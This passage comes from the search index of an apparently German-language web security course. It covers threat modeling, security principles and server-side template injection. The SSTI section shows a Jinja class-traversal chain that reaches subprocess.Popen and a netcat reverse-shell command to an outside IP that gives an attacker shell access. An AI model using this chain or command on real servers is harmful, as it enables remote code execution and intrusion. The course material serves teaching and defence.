verwendet. Jeder Buchstabe dieser Abk\u00fcrzung steht f\u00fcr eine Angriffsart, durch das Analysieren jedes Elements (des Datenflussdiagrammes) sollten m\u00f6glichst viele Gef\u00e4hrdungen identifiziert werden. Die folgende Tabelle listet die jeweiligen Angriffsarten auf:</p> Buchstabe Name S Spoofing T Tampering R Repudiation I Information Disclosure D Denial of Service E Elevation of Privilege <p>Im Privacy Umfeld existiert mit LINDDUN eine \u00e4hnliche Methode, die jeweiligen Angriffe zielen hier nun nicht auf die Sicherheit, sondern auf die Privatsph\u00e4re der Benutzer ab. Die folgende Tabelle listet die jeweiligen Gef\u00e4hrdungen f\u00fcr die Privatsph\u00e4re auf:</p> Buchstabe Name L Linkability I Identifiability N Non-Repudiation D Detectability D Disclosure of Information U Content Unawareness N Policy and Consent Noncompliance <p>Teilweise sind diese Methoden widerspr\u00fcchlich. So wird im Zuge von STRIDE auf die Repudiation hin geachtet, also auf die Nicht-Abstreitbarkeit der Durchf\u00fchrung einer Operation, w\u00e4hrend LINDDUN dies als Non-Repudation als negativ f\u00fcr die Privatsph\u00e4re des Benutzers betrachtet wird.</p>"},{"location":"introduction/security_as_process/#what-should-you-do-about-those-things-that-could-go-wrong","title":"What should you do about those things that could go wrong?","text":"<p>Die identifizierten Gef\u00e4hrdungen k\u00f6nnen dann mittels DREAD quantifiziert und sortiert. Diese Reihenfolge kann bei der Behebung der identifizierten Gef\u00e4hrdungen durch das Entwicklungsteam ber\u00fccksichtigt werden.</p> <p>Prinzipiell gibt es mehrere M\u00f6glichkeiten mit einer Schwachstelle umzugehen:</p> <ul> <li> <p>Elemination: die Schwachstelle wird entfernt \u2014 dies ist effektiv nur   durch Entfernen von Features m\u00f6glich.</p> </li> <li> <p>Mitigation: es werden Ma\u00dfnahmen implementiert die das Ausnutzen der   Schwachstelle vermeiden bzw. erschweren sollen. Die meisten   implementierten Sicherheitsma\u00dfnahmen fallen in diesen Bereich.</p> </li> <li> <p>Transfer: durch Versicherungen und Vertr\u00e4ge kann das Risiko an   Andere \u00fcbertragen werden.</p> </li> <li> <p>Accept: ein Risiko kann auch (durch die Gesch\u00e4ftsf\u00fchrung) akzeptiert   werden. In diesem Fall ist die Dokumentation der Zust\u00e4ndigkeiten   wichtig.</p> </li> </ul>"},{"location":"introduction/security_as_process/#did-we-do-a-decent-job-of-analysis","title":"Did we do a decent job of analysis?","text":"<p>Die Ausarbeitung eines Threat Models macht Sinn wenn das Model mit der realen Applikation \u00fcbereinstimmt und durch die sorgf\u00e4ltige Analyse der Elemente des Models Verwundbarkeiten identifiziert wurden. Die gefundenen Gef\u00e4hrdungen sollten in das Bug-Tracking System der Software einflie\u00dfen um ein Tracking des Fortschritts zu erm\u00f6glichen.</p> <p>Wird im Zuge des Softwareprojekts automatisiert getestet wird empfohlen, mittels Unit Tests die implementierten Mitigations zu verifizieren. Dadurch wird der Security Test Teil der Continues-Integration Pipeline und damit Teil der Qualit\u00e4tssicherung der Software.</p> <p>Zus\u00e4tzlich k\u00f6nnen Penetration Tests zur \u00dcberpr\u00fcfung der Sicherheit durchgef\u00fchrt werden. Penetration Tests k\u00f6nnen Sicherheitsm\u00e4ngel aufdecken, sie sind allerdings nicht zur gezielten Erh\u00f6hung der Softwarequalit\u00e4t dienlich, da diese vor dem Testen bereits gew\u00e4hrleistet werden sollte (You can\u2019t test quality in). Auch hier gibt es eine Interaktion mit dem Threat Model: w\u00e4hrend ein Threat Model im Gegensatz zu Penetration-Tests weniger direkte Sicherheitsl\u00fccken findet, richtet es den Fokus der Penetration-Tests auf die wichtigsten bzw. gef\u00e4hrdetsten Komponenten der zu testenden Applikation.</p>"},{"location":"introduction/security_as_process/#secure-coding","title":"Secure Coding","text":"<p>W\u00e4hrend der Entwicklung sollte durch die Verwendung von Secure Code Guidelines und der Einhaltung von Best-Practises die Sicherheit der erstellten Software gew\u00e4hrleistet werden. Diese Ma\u00dfnahmen zielen darauf ab, das Rad nicht neu zu erfinden. Durch Verwendung etablierter Methodiken und Frameworks kann auf den Erfahrungsschatz dieser zugegriffen werden und potentielle Fehler vermieden werden.</p> <p>Bei der Wahl von Bibliotheken und Frameworks sollte man auf deren Security-Historie R\u00fccksicht nehmen. Regelm\u00e4\u00dfige Bugfix-Releases mit dezidierten Security-Releases sind ein gutes Zeichen. Ebenso sind dies regelm\u00e4\u00dfige Security-Audits. Falls keine Sicherheitsinformationen verf\u00fcgbar sind oder die Bibliothek/das Framework keinen langfristigen Support gew\u00e4hrleistet, ist dies ein Grund ggf. dieses Framework nicht zu verwenden.</p> <p>Das Sicherheitslevel kann durch Verwendung von Security-Checklists \u00fcberpr\u00fcft werden. Ein Beispiel hierf\u00fcr ist der OWASP Application Security Verfication Standard (ASVS) welcher aus einem Fragenkatalog zur Selbstbeantwortung durch Softwareentwickler besteht.</p>"},{"location":"introduction/security_as_process/#secure-testing","title":"Secure Testing","text":"<p>Es sollte so fr\u00fch wie m\u00f6glich und regelm\u00e4\u00dfig wie m\u00f6glich getestet werden. Zumindest vor gr\u00f6\u00dferen Releases sollte ein Security-Check durchgef\u00fchrt werden.</p> <p>Hierbei gibt es eine Interaktion mit Threat Modeling: aufgrund des Threatmodels k\u00f6nnen besonders gef\u00e4hrdete Bereiche identifiziert, und diese Bereiche gezielt getestet werden. Dadurch werden die Kosten des Testens reduziert.</p>"},{"location":"introduction/security_as_process/#maintenance","title":"Maintenance","text":"<p>Auch nach dem Abschluss der Entwicklungsphase eines Projektes gibt es Security-Anforderungen. Es sollte dokumentiert werden, wie im Falle eines Security-Vorfalls (Security Incident) vorgegangen wird. Dieser Prozess kann u.a. die Notifizierung von Kunden, das Deaktivieren von Servern, Bereitstellung eines Patch-Plans, etc. beinhalten.</p> <p>Diese Vorkehrungen m\u00fcssen nicht nur den eigenen Code, sondern auch Schwachstellen in verwendeten Fremdbibliotheken und Frameworks beinhalten. Angriffe gegen verwendete Bibliotheken/Frameworks (eine Form der supply-chain attacks) nahmen in letzter Zeit zu.</p>"},{"location":"introduction/security_as_process/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Was versteht man unter einem Threat Model, welche Elemente sollten    vorhanden sein (1-2 S\u00e4tz.B.schreibung pro Element)</p> </li> <li> <p>Welche Ma\u00dfnahmen sollten im Zuge des Secure Development Lifecycles    betrachtet werden? Erl\u00e4utere einige der Ma\u00dfnahmen.</p> </li> </ol> <p>[1] Functional Requirements beschreiben die Funktionsweise einer Applikation und sind z.B. mittels use-cases abgebildet. Non-Functional Requirements beschreiben eher die Qualit\u00e4t der erstellen Applikation wie Sicherheit und Performance.</p> <p>[2] Mittels Hashes, MACs, Verschl\u00fcsselung, etc. k\u00f6nnen prinzipiell Ver\u00e4nderungen nicht verhindert werden, allerdings k\u00f6nnen Ver\u00e4nderungen im Nachhinein detektiert werden.</p> <p>[3] Quelle: Adam Shostack \u2014 Threat Modeling</p> <p>[4] Bonuspunkte wenn nicht nur die Annahme, sondern zus\u00e4tzlich auch die Auswirkungen im Falle einer gebrochenen Annahme, wer f\u00fcr die \u00dcberpr\u00fcfung der Annahme zust\u00e4ndig ist, und wer fachlich die Annahme \u00fcberpr\u00fcfen kann, dokumentiert ist.</p>"},{"location":"introduction/security_principles/","title":"Security Principles","text":"<p>W\u00e4hrend sich Technologien und Architekturen permanent wandeln und ver\u00e4ndern, gibt es Sicherheitsprinzipien die quasi allgemein g\u00fcltig als Grundlage f\u00fcr alle weiteren Entscheidungen dienen. Einige dieser werden in diesem Kapitel erl\u00e4utert.</p>"},{"location":"introduction/security_principles/#minimalprinzip","title":"Minimalprinzip","text":"<p>Die Applikation sollte nur jene Operationen und Funktionen beinhalten, die f\u00fcr die Erf\u00fcllung der Kundenanforderungen zwingend ben\u00f6tigt werden. Alle weiteren Funktionen und Operationen sollten deaktiviert bzw. entfernt werden.</p> <p>Durch diese Reduktion des Funktionsumfangs wird implizit die Angriffsfl\u00e4che verringert und dadurch Angriffe erschwert. Was nicht vorhanden ist, kann nicht angegriffen werden. Zus\u00e4tzlich wird der langfristige Wartungsaufwand reduziert.</p> <p>Die Minimierung kann und sollte an mehreren Stellen durchgef\u00fchrt werden, einige Beispiele:</p> <ul> <li> <p>Reduktion ben\u00f6tigter Operationen: ist eine Operation wirklich f\u00fcr   den Kunden notwendig oder k\u00f6nnte der Kundenwunsch mit bereits   implementierten Operationen ebenso befriedigt werden?</p> </li> <li> <p>Reduktion der gesammelten und gespeicherten Daten: was ist das   minimale Datenset, dass f\u00fcr die Bereitstellung der Operationen   ben\u00f6tigt wird. Dies entspricht auch der Datenminimierung die durch   die DSGVO[1] vorgeschrieben wird. Hier gibt es einen Wandel der   Kultur: von big-data (alles speichern, vielleicht kann man das   sp\u00e4ter verwenden) Richtung toxic-data (Daten sind gef\u00e4hrlich, wie   komme ich mit m\u00f6glichst wenig Daten aus).</p> </li> <li> <p>Komponentenebene: welche Komponenten sind f\u00fcr den Betrieb notwendig?</p> </li> <li> <p>Funktionale Ebene: welche Funktionen und Features k\u00f6nnen innerhalb   von Komponenten deaktiviert werden?</p> </li> </ul>"},{"location":"introduction/security_principles/#security-misconfiguration","title":"Security Misconfiguration","text":"<p>In den OWASP Top 10 kommen h\u00e4ufiger Security Misconfiguration als Beispiel f\u00fcr Verst\u00f6sse gegen das Minimalprinzip vor.</p> <p>Wie bereits erw\u00e4hnt, ist die Grundidee, dass im Produktionsbetrieb nur Komponenten und Features vorhanden sind, die auch f\u00fcr die Umsetzung eines Kundenwunsches ben\u00f6tigt werden. Beispiele f\u00fcr Software, die nicht am Server vorgefunden werden sollte:</p> <ul> <li> <p>Entwicklungstools wie phpmyadmin. Diese besitzen meistens getrennte   Zugangsdaten (verwenden also nicht die Zugangsdaten/Berechtigungen   der Web-Applikation) und sind daher potentiell ein alternate   channel \u00fcber den auf eine Webapplikation zugegriffen werden kann.</p> </li> <li> <p>Debug Mode bei verwendeten Frameworks, dieser erlaubt teilweise im   Fehlerfall die Verwendung von interaktiven Shells direkt innerhalb   der Webapplikation. Dies w\u00fcrde es einem Angreifer erlauben, direkt   Programmcode abzusetzen.</p> </li> <li> <p>Debug Toolbars bei Verwendung von Frameworks. Diese erlauben es   zeitweise die letzten Sessions aller Benutzer anzuzeigen und   erleichtern auf diese Weise Identity Theft.</p> </li> <li> <p>Stacktraces mit Detailinformationen im Produktivbetrieb. Ein   normaler Anwendern kann mit diesen Informationen nichts anfangen,   ein Angreifer kann durch diese allerdings genaue Systeminformationen   (Bibliotheksversionen, Pfade, etc.) erhalten welche weiter Angriffer   erleichtern k\u00f6nnen.</p> </li> <li> <p>phpinfo.php liefert genaue Informationen \u00fcber die verwendete   PHP-Version, verf\u00fcgbare Module, System- und   Konfigurationsinformationen die im Produktivbetrieb nicht \u00f6ffentlich   verf\u00fcgbar sein m\u00fcssen.</p> </li> </ul> <p>Beispiele f\u00fcr Metadaten, die nicht am Server vorgefunden werden sollten:</p> <ul> <li> <p>Beispielscode wie z.B. ein <code>/example</code> Verzeichnis. Dieser kann   zeitweise ebenso Sicherheitsfehler enthalten und auf diese Weise   Zugang zu dem System erlauben. Auch Beispielscode ohne serverseitige   Exekution kann missbraucht werden, siehe z. B. DOM-basierte   XSS-Angriffe.</p> </li> <li> <p>.git, .svn Verzeichnisse: diese beinhalten den gesamten Source-Code   samt Versionshistory. Ein Angreifer kann auf diese Weise sowohl   interne Credentials erhalten als auch den verwendeten Source Code   analysieren.</p> </li> <li> <p>Credentials im Dateisystem oder in Repositories. Da Repositories   h\u00e4ufig auf \u00f6ffentlichen Webservern gespeichert wird (z.B. private   gitlab, githab oder bitbucket Repositories) gespeichert wird, k\u00f6nnen   diese im Falle einer Fehlkonfiguration auch potentiell \u00f6ffentlich   zugreifbar gemacht werden. In diesem Fall besitzt ein Angreifer   credentials mit denen er potentiell auf sensible Aktivit\u00e4ten oder   Daten zugreifen kann.</p> </li> <li> <p>Backup files (.bak, .tmp) innerhalb des Dateisystems, diese werden   z.B. durch Texteditoren angelegt. Wird z.B. auf einem PHP-System   eine PHP-Datei am Webserver abgelegt und ein Angreifer greift darauf   zu, wird der Code am Server ausgef\u00fchrt und der Angreifer erh\u00e4lt nur   das Ergebnis der Operation. Falls der Angreifer eine Backup-Datei am   Server findet, kann er auf diese zugreifen, herunterladen und   analysieren und kann auf diese Weise Fehler innerhalb des Source   Codes suchen.</p> </li> </ul>"},{"location":"introduction/security_principles/#least-privilege","title":"Least Privilege","text":"<p>Jeder Benutzer und jede Funktion sollte nur jene minimalen Rechte und Privilegien besitzen, die f\u00fcr die Ausf\u00fchrung seiner Ausgabe zwingend ben\u00f6tigt werden. Jerome Saltzer[2] definierte diesen, als Least Privilege bekannten, Ansatz als:</p> <p>Every program and every priviledged user of the system should operate using the least amount of priviledge necessary to complete the job.</p> <p>Wird dieses Prinzip bereits w\u00e4hrend des Designs beachtet, f\u00fchrt dies zumeist zu Systemen, welche aus mehreren Komponenten bestehen. Diese Komponenten kommunizieren \u00fcber wohl-definierte Interfaces und k\u00f6nnen nicht \u201cdirekt\u201d auf die Daten anderer Komponenten zugreifen. Dies verbessert die Testbarkeit der einzelnen Komponenten, da diese getrennt voneinander \u00fcberpr\u00fcft werden k\u00f6nnen. Aus Sicherheitssicht ist diese Architektur ebenso stark zu bevorzugen da eine kompromittierte Komponente nicht automatisch ein kompromittiertes Gesamtsystem zur Folge hat.</p> <p>Um diese Trennung zu erm\u00f6glichen, m\u00fcssen Komponenten mit unterscheidbaren Identit\u00e4ten und mit zuweisbaren Ressourcen betrieben werden. Dies inkludiert sowohl Benutzer- und Zugriffsrechte als auch Entitlements auf Ressourcen (RAM, CPU, Speicher, Netzwerkbandbreite). Weiters inkludiert dies Netzwerkzugriffsrechte: die Applikation sollte nur auf jene remote Server zugreifen k\u00f6nnen, die auch wirklich zwingend f\u00fcr den Betrieb notwendig sind.</p>"},{"location":"introduction/security_principles/#separation-of-duties","title":"Separation of Duties","text":"<p>Separation of Duties besagt, dass zur Ausf\u00fchrung einer Operation die Zustimmung von mehr als einer Person ben\u00f6tigt wird. Ein klassisches Beispiel hierf\u00fcr w\u00e4re die Aktivierung eines Atomsprengkopfes f\u00fcr das mehrere Personen ihre Zustimmung geben m\u00fcssen. Das Ziel von Separation of Duties ist auf der einen Seite die Vermeidung von Insider-Threats, auf der anderen Seite soll dadurch die Entdeckungsrate von nicht-gewollten Aktivit\u00e4ten erh\u00f6ht werden. Grunds\u00e4tzlich sollte ein kompromittierter Benutzer nicht die M\u00f6glichkeit besitzen, das Gesamtsystem zu korrumpieren.</p> <p>Eine Anwendung dieser Idee ist das Vier-Augen-Prinzip bei dem sensible Operationen vor Ausf\u00fchrung zuerst durch zumindest zwei Personen best\u00e4tigt werden m\u00fcssen.</p> <p>Um diese Prinzipien anwenden zu k\u00f6nnen, m\u00fcssen Anwender zweifelsfrei identifiziert, authentifiziert und f\u00fcr die auszuf\u00fchrende Operationen autorisiert werden. Aus diesem Grund werden Mehr-Faktor-Authentifizierungsl\u00f6sungen h\u00e4ufig im Umfeld des Separation of Duties Prinzips gefunden.</p>"},{"location":"introduction/security_principles/#defense-in-depthhardening","title":"Defense in Depth/Hardening","text":"<p>Das Zwiebelmodel der Sicherheit vergleicht die Gesamtsicherheit einer Applikation mit einer Zwiebel. Im Inneren der Zwiebel befindet sich das sch\u00fctzenswerte Gut (Daten, Operationen), rundherum gibt es einzelne Sicherheitsschichten, analog zu den Schichten einer Zwiebel. Solange zumindest eine Schutzschicht vorhanden ist, ist die Sicherheit des Gesamtsystems gew\u00e4hrleistet.</p> <p>Essentiell ist, dass die einzelnen Schutzschichten voneinander unabh\u00e4ngig sind. W\u00fcrde die gleiche Schutzschicht mehrfach verwendet werden (z.B. zweimal die gleiche Web-Application-Firewall mit dem identen Regelwerk der Applikation vorgeschalten werden), w\u00fcrde ein Fehler in einer Schutzschicht automatisch auch den Schutz der zweiten Schutzschicht neutralisieren.</p> <p>Zus\u00e4tzlich zum erh\u00f6hten Schutz des sch\u00fctzenswerten Gutes wird durch die Zwiebelschichten auch Zeit im Fehlerfall erkauft. Da das System noch nicht vollst\u00e4ndig kompromittiert ist, besteht z.B. Zeit die Auswirkungen eines potentiellen Updates zu testen.</p>"},{"location":"introduction/security_principles/#fail-open-vs-fail-closed","title":"Fail-Open vs. Fail-Closed","text":"<p>Fail-Open (auch Fail-Safe genannt) und Fail-Close (auch Fail-Secure genannt) beschreiben das Verhalten eines Systems im Fehlerfall. Bei Fail-Open wird die Operation durchgef\u00fchrt, bei Fail-Close wird diese verhindert.</p> <p>Die Definition des gew\u00fcnschten Verhaltens kann nur durch den Kunden geschehen. Beispiel: ein Smart-T\u00fcrschloss welches \u00fcber eine Mobilapplikation gesteuert werden kann. Das Verhalten im Falle eines Batteriefehlers kann unterschiedlich implementiert werden. In einigen F\u00e4llen (Notausgang) w\u00e4re es sinnvoll, das Schloss zu \u00f6ffnen; in einigen F\u00e4llen (Tresor) w\u00e4re es sinnvoll, das Schloss zu blockieren. Diese Auswahl kann nur vom Kunden durchgef\u00fchrt werden.</p>"},{"location":"introduction/security_principles/#no-go-security-by-obscurity","title":"No-Go: Security by Obscurity","text":"<p>Die Sicherheit eines Systems darf niemals von dessen Intransparenz abh\u00e4ngig sein. Ein besserer Ansatz ist z.B. Shannons: The Enemy Knows the System.</p> <p>Ein motivierter Angreifer besitzt zumeist M\u00f6glichkeiten die Intransparenz zu l\u00fcften:</p> <ul> <li> <p>Kauf und Reverse-Engineering der Software</p> </li> <li> <p>Diebstahl eines Systems</p> </li> <li> <p>Verlust der Obscurity durch Unfall (z.B. Selfies mit sichtbaren   Schl\u00fcsseln im Hintergrund)</p> </li> </ul> <p>Analog gibt es in der Kryptographie das Kerckhoffsche Prinzip: die Sicherheit eines Algorithmus darf nur von der Geheimhaltung des Schl\u00fcssels und nicht durch die Geheimhaltung des Algorithmus abh\u00e4ngig sein. 2020 konnte man die Problematik an Hand des Solarwind-Leaks sehen: hier konnten Angreifer Zugriff auf Microsofts Quellcode erlangen. Aktuell (Stand J\u00e4nner 2021) wurden hier allerdings keine Masterpassw\u00f6rter oder Backdoors bekannt.</p>"},{"location":"introduction/security_principles/#keep-it-simple-stupid-kiss","title":"Keep it Simple Stupid (KISS)","text":"<p>Complexity is the enemy of security. Ein komplexes System mit vielen Komponenten bzw. Interaktionen zwischen Komponenten besitzt automatisch eine gr\u00f6\u00dfere Angriffsfl\u00e4che und bieten daher Angreifern mehr M\u00f6glichkeiten.</p> <p>Man sollte Simplicity nicht mit primitiven L\u00f6sungen verwechseln. Der Grundgedanke stammt von Kelly Johnson der bei Skunk Works Chefingenioer war, also Leiter jenes Ingenieursteams welches einige der hoch-technologischsten Aufkl\u00e4rungsflugzeuge des Kalten Krieges entwurf (U2, SR-71).</p>"},{"location":"introduction/security_principles/#security-by-design-bzw-security-by-default","title":"Security-by-Design bzw. Security-by-Default","text":"<p>Analog zu dem in der DSGVO/GDPR verankerten privacy-by-design bzw. privacy-by-default wird mittlerweile auch gerne von security-by-design und security-by-default gesprochen. Ersteres bedeutet, dass eine Software so geschrieben sein sollte, dass ein sicherer Betrieb prinzipiell m\u00f6glich ist. Letzteres bedeutet, dass, wenn ein sicherer Betrieb m\u00f6glich ist, dieser auch per-default so konfiguriert sein sollte. Dies soll Sicherheitsfehler aufgrund von \u201cvergessener\u201d bzw. unterlassender Konfiguration vermeiden, Sicherheitsl\u00fccken m\u00fcssen explizit ge\u00f6ffnet werden.</p> <p>Beides sind keine direkten Entwicklugsprinzipen aber quasi Vorgaben an welche sich die Entwicklung halten muss und wurden aus diesem Grund hier erw\u00e4hnt.</p>"},{"location":"introduction/security_principles/#trennung-von-daten-und-programm-logik","title":"Trennung von Daten- und Programm-Logik","text":"<p>Ein typischer Vorfall der zu einer Sicherheitsl\u00fccke f\u00fchrt ist, wenn ein Programm bei der Zuordnung zwischen Daten und Programmlogik verwirrt wird. Eine SQL-Injection f\u00e4llt in dieses Muster: eine Benutzereingabe (Daten) wird durch inad\u00e4quate Programmierung als Programmlogik bzw. Programmcode interpretiert und ausgef\u00fchrt.</p> <p>Historisch gab es gegenl\u00e4ufige Computerarchitekturen: die Harvard-Architektur verwendete eine strikte Hardware-Trennung zwischen Daten- und Programmspeicher. Die konkurrierende Von-Neumann-Architektur verwendete einen Speicher sowohl f\u00fcr Daten als auch f\u00fcr Programmcode und setzte sich aufgrund der h\u00f6heren Effizienz durch. Mittlerweile gibt es mehrere Sicherheitsvorkehrungen um eine konzeptionelle Trennung von Programmcode und Daten auch in diesen Architekturen durchzuf\u00fchren.</p>"},{"location":"introduction/security_principles/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Erl\u00e4utere das Minimalprinzip mit zumindest drei Beispielen f\u00fcr    jenes.</p> </li> <li> <p>Erl\u00e4utere Least Privilege und Separation of Duties.</p> </li> <li> <p>Erl\u00e4utere Defense in Depth.</p> </li> <li> <p>Erkl\u00e4re den Unterschied zwischen Fail-Open und Fail-Closed.</p> </li> <li> <p>Welche Probleme k\u00f6nnen durch die Vermischung von Applikationlogik    und Eingabedaten entstehen?</p> </li> </ol> <p>[1] Datenschutzgrundverordnung, siehe auch https://de.wikipedia.org/wiki/Datenschutz-Grundverordnung</p> <p>[2] Jerome Saltzer war an der Entwicklung von Multics involviert und leitete sp\u00e4ter Projekt Athena am MIT. Dieses Projekt war massgeblich an der Entwicklung graphischer Oberfl\u00e4chen und Netzwerktechnologien wie z.B. Kerberos involviert.</p>"},{"location":"server-side-attacks/SSTI/","title":"Server-Side Template Injection (SSTI)","text":"<p>Web-Applikationen verwenden Template-Engines um dynamische Inhalte zu pr\u00e4sentieren. Anstatt eine Seite starr zu kodieren, wird ein Template server-seitig in einer Datenbank gespeichert (z.B. als String/Text). Wird die Seite angezeigt, wird das Template mit den aktuellen Daten kombiniert und die resultierende Seite angezeigt. H\u00e4ufig k\u00f6nnen eingeloggte Benutzer (im Folgenden Autoren genannt) Templates server-seitig modifizieren und auf diese Weise das Layout modifizieren.</p> <p>Durch die Verwendung von Templates ergeben sich Vorteile:</p> <ul> <li> <p>Content-Autoren k\u00f6nnen Templates modifizieren (z.B. mittels eines   WYSIWYG\u2013Editor innerhalb des Administrationsbereichs) ohne auf den   Source-Code der Applikation Zugriff zu ben\u00f6tigen.</p> </li> <li> <p>Die verwendeten Template-Sprachen sind zumeist einfacher als   ,,volle\u201d Programmiersprachen und k\u00f6nnen daher auch leichter   angelernt werden und erlauben es so einem gr\u00f6\u00dferen Benutzerkreis die   Inhalte der Webseite zu modifzieren.</p> </li> <li> <p>Die Daten, auf welche ein Template zugreifen kann, k\u00f6nnen limitiert   werden. Auf diese Weise k\u00f6nnen Content-Autoren nur auf ein Subset   der server-seitigen Daten zugreifen.</p> </li> </ul> <p>Nat\u00fcrlich ergeben sich auch Angriffsm\u00f6glichkeiten. Kann ein Angreifer ein Template modifizieren und anschlie\u00dfend zur Ausf\u00fchrung bringen, besitzt er die M\u00f6glichkeit am Server Code (innerhalb der Template-Engine) auszuf\u00fchren. Nun ben\u00f6tigt er noch die M\u00f6glichkeit, aus dem Template-System auszubrechen und in der zugrunde liegenden Umgebung (z.B. in die Web-Applikation) Befehle auszuf\u00fchren. Dies w\u00e4re dann eine Remote Command Execution (RCE).</p>"},{"location":"server-side-attacks/SSTI/#beispiel-template-system-jinja-python","title":"Beispiel Template System: Jinja (Python)","text":"<p>Eine h\u00e4ufig verwendete Template Engine in Python-basierten Web-Applikationen ist Jinja[8]. In einem Template werden prim\u00e4r zwei verschiedene Kommando-Tags zum Inkludieren von Daten bzw. Kommandos verwendet:</p> <pre><code>&lt;ul&gt;\n    {% for item in somelist %}\n      &lt;li&gt; {{ item }} &lt;/li&gt;\n    {% endfor %}\n&lt;/ul&gt;\n</code></pre> <p>Dieses Jinja/HTML-Fragment baut eine Aufz\u00e4hlungsliste (mittels dem ul-Tag). Es verwendet Template-Tags um eine Python-for-Schleife zu inkludieren. Diese Schleife iteriert \u00fcber die somelist Liste und inkludiert jedes Item in einem li-Element.</p>"},{"location":"server-side-attacks/SSTI/#exploitation","title":"Exploitation","text":"<p>In einem typischen Szenario hat der Angreifer bereits Zugriff auf ein System erlangt und kann sowohl ein Template bearbeiten als auch ausf\u00fchren. Dies kann z.B. durch Erlangen eines CMS-Autor-Accounts innerhalb der Weboberfl\u00e4che geschehen. Innerhalb dieser Oberfl\u00e4che kann der Angreifer ein Template (z.B. f\u00fcr versendete Emails) modifizieren als auch, z.B. als ,,Preview\u201d, anzeigen (und dadurch das Template zur Exekution bringen).</p> <p>Der Angreifer verwendet hierf\u00fcr z.B. die gezeigen {{ \u2026}} Tags. Er besitzt allerdings nur Zugriff auf Objekte, welche in das Template vom System hinein \u00fcbergeben wurden. Bei unserem Beispiel w\u00e4re dies die Liste somelist. Hier kann er allerdings das Python-Typsystem ausnutzen um Zugriff auf weitere Objekte zu erlangen. Schlussendlich will der Angreifer zu einem Objekt bzw. zu einer Klasse gelanten, welche ihm die Ausf\u00fchrung von Code am Server erlaubt.</p> <p>In Python kann \u00fcber das Attribut __class__ auf die Klasse eines Objekts zugegriffen werden, die Methode mro liefert sowohl die eigene Klasse als auch alle Elternklassen eines Objektes:</p> <pre><code>somelist = [1,2,3]\nsomelist.__class__         # -&gt; &lt;type 'list'&gt;\nsomelist.__class__.mro()   # -&gt; [&lt;type 'list'&gt;, &lt;type 'object'&gt;]\nobj_class = somelist.__class__.mro()[1]\n</code></pre> <p>Somit erhaltne wir \u00fcber ,,somelist.__class__.mro()\u201d alle Klassen (inklusive vererbter Klassen) des Objekts ,,somelist\u201d. In Python erben alle Klassen von der Elternklasse ,,Object\u201d welche wir \u00fcber die Array-Position 1 selektieren und der Variablen ,,obj_class\u201d zuweisen. Klassen in Python besitzen die Methode ,,__subclasses__\u201d welche eine Liste von allen aktuell bekannten Subklassen zur\u00fcck liefert. Diese Liste ist dynamisch sowohl die Elemente, als auch die Reihung jener, kann zur Laufzeit variieren.</p> <p>Ein Angreifer kann diese Liste ausgeben und eine potentiell verwundbare Klasse, wie z.B. ,,subprocess.Popen\u201d suchen und \u00fcber den Index diese Klasse selektionen. Nehmen wir an, dass diese Klasse in unserem Beispiel auf Array Position 42 vorhandne war. Durch Hinzuf\u00fcgen von ,,()\u201d wird nun der Konstruktor der Klasse aufgerufen, hierbei k\u00f6nnen Parameter angegeben werden. Bei ,,Popen\u201d kann ein Array mit Parametern \u00fcbergeben werden. Diese werden zusammenkopiert und beim Aufruf des Konstruktors als Systemkommando ausgef\u00fchrt:</p> <pre><code>obj_class = somelist.__class__.mro()[1]\nobj_class.__subclasses__()[42]   # -&gt; &lt;class 'subprocess.Popen'&gt;\nobj_class.__subclasses__[42]([\"nc\", \"10.0.0.1\", \"443\", \"-e\", \"/bin/sh\"])\n</code></pre> <p>Bei diesem Beispiel wird somit als Kommando <code>ns 10.0.0.1 443 -e /bin/sh</code> aufgerufen: dieses Kommando baut eine reverse-shell auf, ein Angreifer erh\u00e4lt auf diese Weise Shell-Zugriff auf den Server mit den Rechten der Web-Applikation.</p> <p>Webapplikationen versuchen h\u00e4ufig, Benutzereingaben in Templates auf Schadcode hin zu \u00fcberpr\u00fcfen. Dies ist problematisch da Templates viele M\u00f6glichkeiten bieten, Schadcode zu verschleiern und auf diese Weise Absicherungen zu umgehen[9]. Als Angreifer sucht man in diesem Fall am Besten nach ,,bypass\u201d und dem Namen der verwendeten Template-Engine.</p> <p>Ein Exploit gegen ein Template-System kann selten zu 100% statisch erfolgen da die Liste der Subklassen von ,,Object\u201d dynamisch ist: sowohl die Elemente als auch deren Position ist von der Laufzeitumgebung abh\u00e4ngig und kann sich bei jedem Start der Webapplikation ver\u00e4ndern. Ein Angreifer wird daher zumeist mehrstufig vorgehen und nach Erlangen des Zugriffs auf das CMS initial versuchen aussichtsreiche Objekt-Klassen und deren Position (im Subklassen-Array) zu identifizieren. Anschlie\u00dfend wird er versuchen, erfolgversprechende Klassen zu instanzieren und auf diese Weise Schadcode auszuf\u00fchren.</p>"},{"location":"server-side-attacks/allgemein/","title":"Serverseitige Angriffe","text":"<p>Ein Grundsatz der Programmierung ist Garbage-In, Garbage-Out. In Anlehnung an FIFO (First-In, First-Out) wird damit ausgedr\u00fcckt, dass durch \u201cschlechte\u201d Benutzereingaben undefiniertes Verhalten produziert wird. W\u00e4hrend dies urspr\u00fcnglich funktional gedacht war, ist diese Aussage auch f\u00fcr die Sicherheit einer Applikation relevant.</p> <p>Benutzern kann nicht getraut werden. W\u00e4hrend gutartige Benutzer bestenfalls wirre Eingaben erstellen, werden durch b\u00f6sartige Benutzer Eingaben durchgef\u00fchrt, die gezielt die Sicherheit eines Systems kompromittieren sollten. Das Grundmuster ist, dass eine Benutzereingabe als Kommando interpretiert wird. Dies wird durch Angreifer ausgenutzt um, von der Applikation ungewollte, Kommandos abzusetzen. Diese Kommandos werden dann mit den Rechten der Webapplikation (oder eines weiteren Hintergrundsystems) ausgef\u00fchrt.</p> <p>Ein Problem ist die gro\u00dfe Angriffsfl\u00e4che da nicht nur die direkt Eingabe-verarbeitenden Stellen \u00fcberpr\u00fcft werden m\u00fcssen, sondern alle Programmteile die potentiell Benutzereingaben indirekt erhalten k\u00f6nnen (z.B. Daten aus deiner Datenbank auslesen, die urspr\u00fcnglich von einem Benutzer bereitgestellt wurden). Ebenso muss ein Ausbruch nicht direkt am angegriffenen System erfolgen, sondern kann auch auf Hintergrundsystemen passieren. Beispielsweise kann ein Angreifer eine Webapplikation angreifen, bricht aber erst auf Datenbankebene aus dem System aus (auf einem getrennten Datenkbankserver).</p> <p>Da Tests auf Injection-Angriffe meist gegen bestimmte Operationen und bestimmte Hintergrundsysteme gerichtet sind 